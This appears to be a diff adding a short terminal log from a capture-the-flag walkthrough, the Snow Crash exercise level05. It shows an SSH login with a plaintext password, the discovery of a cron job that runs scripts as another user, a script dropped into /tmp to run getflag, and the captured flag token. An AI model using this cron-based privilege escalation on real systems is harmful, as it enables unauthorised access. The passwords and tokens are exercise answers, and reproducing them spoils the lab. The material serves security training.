@@ -1,0 +1,13 @@
+┌──$ [~/42/2020/snow-crash]
+└─>  ssh 192.168.1.64 -p 4242 -l level05
+level05@192.168.1.64's password: ne2searoevaevoem4ov4ar8ap
+You have new mail.
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+# At every 2nd minute the script /usr/sbin/openarenaserver will be executed
+level05@SnowCrash:~$ cat << EOF > /tmp/script
+> #!/bin/bash
+> /bin/getflag > /tmp/flag
+> EOF
+level05@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
